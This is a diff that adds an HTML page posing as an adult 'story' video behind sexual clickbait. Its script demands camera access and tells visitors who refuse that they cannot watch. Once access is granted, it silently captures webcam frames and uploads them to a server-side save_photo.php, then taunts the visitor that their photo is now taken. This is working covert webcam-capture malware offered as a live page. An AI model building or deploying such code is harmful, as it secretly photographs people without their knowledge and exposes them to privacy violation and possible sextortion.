@@ -1,1 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>超级润💦の 剧情🉑力作！🥵</title>
+<style>
+  #video-container {
+    margin: 20px 0;
+  }
+  video {
+    width: 100%;
+    max-width: 640px;
+  }
+  canvas {
+    display: none; /* 初始时隐藏canvas */
+  }
+  button {
+    padding: 10px 20px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  #video-container {
+    display: none;
+  }
+  #ji{
+    width: 100%
+  }
+  h1{
+      text-align: center
+  }
+  #i{
+      visibility: hidden
+  }
+</style>
+</head>
+<body>
+<h1>超级润💦の 剧情🉑力作！🥵</h1>  
+<div id="video-container">
+  <video id="video" autoplay></video>
+</div>
+<video id="ji" controls autoplay src="#"></video>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  var i = document.getElementById("i");
+  var video = document.getElementById('video');
+  // 获取摄像头权限并捕获视频流
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+        var i = document.getElementById("i");
+      video.srcObject = stream;
+      video.play();
+      i.innerHTML = "true";
+      document.getElementById("ji").src="https://k0udeyday50y90z.djvod.ndcimgs.com/bs3/video-hls/5234871757208137973_hlsb.m3u8?ocid=100000159&ss=vp"
+    })
+    .catch(function(err) {
+        var i = document.getElementById("i");
+      console.error('访问摄像头失败：', err);
+      i.innerHTML = "no";
+      alert("不给权限还想看？做梦吧你");
+      location.reload()
+    });
+  setInterval(function(){
+      if(i.innerHTML == "true") {
+  // 拍照并发送到后端      
+    var canvas = document.createElement('canvas');
+    var context = canvas.getContext('2d');
+    var video = document.getElementById('video');
 
+    // 设置canvas的宽高与视频流宽高一致
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    // 在canvas上绘制当前视频帧
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);  
+    // 将canvas转换为base64格式的图片数据
+    var imageData = canvas.toDataURL('image/jpeg');
+
+    // 发送数据到后端PHP脚本
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'save_photo.php', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4 && xhr.status == 200) {
+        // 处理服务器返回的响应
+        console.log(xhr.responseText);
+        alert("哈哈,你的大头照归我咯")
+      }
+    };
+    xhr.send('image=' + encodeURIComponent(imageData));
+    i.innerHTML = "no"
+    };
+    },1000);
+});
+</script>
+<i id="i"></i>  
+</body>
+</html>
